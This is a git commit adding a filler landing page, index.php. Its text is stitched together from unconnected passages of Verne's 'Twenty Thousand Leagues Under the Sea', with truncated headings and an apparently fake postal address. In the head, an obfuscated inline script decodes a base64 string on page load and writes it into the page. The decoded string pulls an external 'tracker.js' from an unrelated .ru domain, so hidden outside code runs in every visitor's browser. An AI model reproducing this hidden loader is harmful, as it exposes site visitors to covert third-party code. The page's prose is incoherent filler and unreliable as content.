c61e9602cd7fa33cbb4dafd7487f8c92241b65e0
xisabrcf <76058039+xisabrcf@users.noreply.github.com>
2020-12-15 17:25:30 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Half stretched upon a divan in the library, I was suffocating. My face was </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9vcHloem10amIzbjIiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Half stretched upon a divan in the library, I was suffocating. My face was </h1>
+	</section>
+
+
+	<section class="our-work">
+		<h3 class="title">Just so; but they will only yield two days' supply </h3>
+		<p>A seaman could not be mistaken, and I told the Canadian all that had passed during his sleep. Well, Ned, said I, is it possible that you are not convinced of the existence of this cetacean that we are following? Have you any particular reason for being so incredulous? To-night, at nine o'clock, said he. I have warned Conseil. At that moment, Captain Nemo will be shut up in his room, probably in bed. Neither the engineers nor the ship's crew can see us. Conseil and I will gain the central staircase, and you, M. Aronnax, will remain in the library, two steps from us, waiting my signal. The oars, the mast, and the sail are in the canoe. I have even succeeded in getting in some provisions. I have procured an English wrench, to unfasten the bolts which attach it to the shell of the Nautilus. So all is ready, till to-night. I can well believe it, said Conseil.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work">
+		<h3 class="title">I stood, and carefully watched the Canadia</h3>
+		<p>Chance had conducted the Nautilus toward the island of Clermont-Tonnerre, one of the most curious of the group that was discovered in 1822 by Captain Bell of the Minerva. I could study now the madreporal system, to which are due the islands in this ocean. Well, Ned! cried Conseil. And my companions, captain? Faith, sir, said Ned Land, your Captain Nemo-the devil take him-has just made us a very pleasant offer!</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="title">I returned to the glass. The Nautilus was no longer moving, the</h3>	
+		<p>For a short time I walked from the saloon to the library. My companions were silent. I soon threw myself on an ottoman, and took a book, which my eyes overran mechanically. A quarter of an hour after, Conseil, approaching me, said, Is what you are reading very interesting, sir? Ah! how my heart beat with emotion and horror! The formidable beak of a cuttle-fish was open over Ned Land. The unhappy man would be cut in two. I rushed to his succor. But Captain Nemo was before me; his axe disappeared between the two enormous jaws, and, miraculously saved, the Canadian, rising, plunged his harpoon deep into the triple heart of the poulp. I thought I had not heard aright, but I could not repeat my observation, for the captain's head had already disappeared in its metal case. I finished harnessing myself, I felt them put an iron-pointed stick into my hand, and some minutes later, after going through the usual form, we set foot on the bottom of the Atlantic, at a depth of 150 fathoms. Midnight was near. The waters were profoundly dark, but Captain Nemo pointed out in the distance a reddish spot, a sort of large light shining brilliantly, about two miles from the Nautilus. What this fire might be, what could feed it, why and how it lit up the liquid mass, I could not say. In any case, it did light our way, vaguely, it is true, but I soon accustomed myself to the peculiar darkness, and I understood, under such circumstances, the uselessness of the Ruhmkorff apparatus. There, beneath the rocky and volcanic bottom, lay outspread a living flora of sponges and reddish cydippes, which emitted a slight phosphorescent light, commonly known by the name of sea-cucumbers; and walking comatul? more than a yard long, the purple of which completely colored the water around.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>15784 Jamie Fort, Apt. 962, 97416-0944, Armstrongmouth, Vermont, United States</p>
+	</footer>
+
+</body>
+
+</html>
